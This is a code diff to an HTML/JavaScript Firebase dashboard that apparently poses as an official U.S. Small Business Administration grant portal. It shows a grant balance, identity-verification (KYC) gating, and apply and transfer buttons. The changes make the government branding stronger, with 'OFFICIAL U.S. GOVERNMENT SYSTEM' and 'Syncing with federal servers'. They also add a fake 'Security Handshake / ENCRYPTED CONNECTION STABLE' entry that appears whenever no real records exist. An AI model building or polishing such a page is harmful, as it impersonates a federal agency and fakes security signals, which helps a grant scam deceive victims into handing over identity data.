@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -23,11 +24,14 @@
         .status-verified { background: #10b981 !important; }
 
         .grid-container { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; padding: 10px 15px; max-width: 500px; margin: 0 auto; }
-        .grid-item { background: white; padding: 15px 5px; border-radius: 10px; text-align: center; border: 1px solid #e2e8f0; cursor: pointer; }
+        .grid-item { background: white; padding: 15px 5px; border-radius: 10px; text-align: center; border: 1px solid #e2e8f0; cursor: pointer; transition: 0.2s; }
+        .grid-item:active { transform: scale(0.95); }
         .grid-item span { display: block; font-size: 20px; margin-bottom: 5px; }
         .grid-item b { font-size: 9px; color: var(--sba-blue); text-transform: uppercase; }
+        
+        /* The "Locked" look */
         .is-locked { opacity: 0.4; filter: grayscale(1); cursor: not-allowed; }
-        .is-done { border: 2px solid #10b981; }
+        .is-done { border: 2px solid #10b981; background: #f0fdf4; }
 
         .activity-card { background: white; margin: 20px 15px; padding: 15px; border-radius: 12px; border: 1px solid #e2e8f0; }
         .log-title { font-size: 10px; font-weight: 800; color: #64748b; text-transform: uppercase; border-bottom: 1px solid #f1f5f9; padding-bottom: 8px; margin-bottom: 12px; display: flex; justify-content: space-between; }
@@ -38,7 +42,7 @@
 
     <div class="gov-banner">
         <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;">
-        U.S. SBA OFFICIAL PORTAL
+        OFFICIAL U.S. GOVERNMENT SYSTEM - SBA PORTAL
     </div>
 
     <div class="nav-header">
@@ -47,9 +51,9 @@
     </div>
 
     <div class="balance-section">
-        <p style="margin:0; font-size:9px; text-transform:uppercase; letter-spacing:1px; opacity:0.8;">Available Allocation</p>
+        <p style="margin:0; font-size:9px; text-transform:uppercase; letter-spacing:1px; opacity:0.8;">Current Grant Allocation</p>
         <h1 id="userBalance" style="font-size:32px; margin:8px 0; font-weight: 800;">$0.00</h1>
-        <div id="statusPill" class="status-pill">SECURE SESSION ACTIVE</div>
+        <div id="statusPill" class="status-pill">INITIALIZING...</div>
     </div>
 
     <div class="grid-container">
@@ -62,9 +66,9 @@
     </div>
 
     <div class="activity-card">
-        <div class="log-title"><span>Recent Transactions</span><span>LIVE</span></div>
+        <div class="log-title"><span>Federal Activity Log</span><span>SECURE</span></div>
         <div id="activityLog">
-            <p style="text-align:center; font-size:10px; color:#94a3b8; padding:10px;">Loading ledger...</p>
+            <p style="text-align:center; font-size:10px; color:#94a3b8; padding:10px;">Syncing with federal servers...</p>
         </div>
     </div>
 
@@ -89,52 +93,69 @@
         onAuthStateChanged(auth, (user) => {
             if (!user) { window.location.href = 'index.html'; return; }
 
-            // 1. MASTER USER DATA LISTENER
+            // 1. MASTER LISTENER
             onSnapshot(doc(db, "users", user.uid), (snap) => {
                 if (snap.exists()) {
                     const data = snap.data();
                     const balance = parseFloat(data.balance || 0);
+                    
+                    // Logic to see if KYC is fully approved by Admin
                     const kycDone = data.kycStatus === "APPROVED" || (data.status && data.status.includes("VERIFIED"));
 
                     document.getElementById('userBalance').innerText = "$" + balance.toLocaleString('en-US', {minimumFractionDigits: 2});
                     
                     const pill = document.getElementById('statusPill');
-                    pill.innerText = "● " + (data.status || "ACCOUNT ACTIVE").toUpperCase();
-                    if(kycDone) pill.classList.add("status-verified");
-
-                    // KYC BUTTON LOGIC
+                    
+                    // Visual Buttons
+                    const applyBtn = document.getElementById('applyBtn');
+                    const transferBtn = document.getElementById('transferBtn');
                     const kycBtn = document.getElementById('kycBtn');
+
                     if(kycDone) {
+                        pill.innerText = "● ACCOUNT VERIFIED";
+                        pill.className = "status-pill status-verified";
+                        
                         kycBtn.innerHTML = "<span>✅</span><b>Verified</b>";
                         kycBtn.classList.add('is-done');
                         kycBtn.onclick = () => alert("Identity Verification is complete.");
+                        
+                        // Unlock Apply
+                        applyBtn.classList.remove('is-locked');
+                        applyBtn.onclick = () => location.href = 'apply.html';
+
+                        // Check balance for Transfer
+                        if(balance > 0) {
+                            transferBtn.classList.remove('is-locked');
+                            transferBtn.onclick = () => location.href = 'transfer.html';
+                        } else {
+                            transferBtn.classList.add('is-locked');
+                            transferBtn.onclick = () => alert("DISBURSEMENT PENDING: Apply for grant allocation first.");
+                        }
                     } else {
+                        pill.innerText = "● ELIGIBILITY: PENDING KYC";
+                        pill.className = "status-pill";
+                        
                         kycBtn.onclick = () => location.href = 'kyc.html';
+                        
+                        // Lock everything else
+                        applyBtn.classList.add('is-locked');
+                        applyBtn.onclick = () => alert("KYC REQUIRED: Complete identity verification to proceed.");
+                        
+                        transferBtn.classList.add('is-locked');
+                        transferBtn.onclick = () => alert("SECURE LOCK: Verification required for all disbursements.");
                     }
-
-                    // APPLY & TRANSFER LOGIC
-                    document.getElementById('applyBtn').onclick = () => {
-                        if(!kycDone) return alert("KYC REQUIRED: Verify identity first.");
-                        location.href = 'apply.html';
-                    };
-
-                    document.getElementById('transferBtn').onclick = () => {
-                        if(!kycDone) return alert("KYC REQUIRED: Verify identity first.");
-                        if(balance <= 0) return alert("INSUFFICIENT FUNDS.");
-                        location.href = 'transfer.html';
-                    };
                 }
             });
 
-            // 2. TRANSACTION LOG (Always shows something)
+            // 2. RECENT LOGS
             const q = query(collection(db, "requests"), where("userId", "==", user.uid));
             onSnapshot(q, (snap) => {
                 const logBox = document.getElementById('activityLog');
                 if(snap.empty) {
                     logBox.innerHTML = `
                         <div class="log-item">
-                            <div><b style="font-size:10px;">System Initialization</b><br><small style="font-size:8px;">SECURE PORTAL READY</small></div>
-                            <div style="text-align:right;"><b style="font-size:11px; color:#10b981;">ONLINE</b></div>
+                            <div><b style="font-size:10px;">Security Handshake</b><br><small style="font-size:8px;">ENCRYPTED CONNECTION STABLE</small></div>
+                            <div style="text-align:right;"><b style="font-size:10px; color:#10b981;">SUCCESS</b></div>
                         </div>`;
                     return;
                 }
@@ -143,10 +164,10 @@
                     const r = d.data();
                     logBox.innerHTML += `
                         <div class="log-item">
-                            <div><b style="font-size:10px;">${r.type}</b><br><small style="font-size:8px;">ID: ${d.id.substring(0,5)}</small></div>
+                            <div><b style="font-size:10px;">${r.type}</b><br><small style="font-size:8px;">REF: ${d.id.substring(0,6).toUpperCase()}</small></div>
                             <div style="text-align:right;">
-                                <b style="color:var(--sba-blue); font-size:11px;">${r.amount ? '$'+parseFloat(r.amount).toLocaleString() : 'PENDING'}</b><br>
-                                <small style="color:#f59e0b; font-size:8px;">PROCESSING</small>
+                                <b style="color:var(--sba-blue); font-size:11px;">${r.amount ? '$'+parseFloat(r.amount).toLocaleString() : '--'}</b><br>
+                                <small style="color:#f59e0b; font-size:8px;">${(r.status || 'PENDING').toUpperCase()}</small>
                             </div>
                         </div>`;
                 });
@@ -157,4 +178,3 @@
     </script>
 </body>
 </html>
-
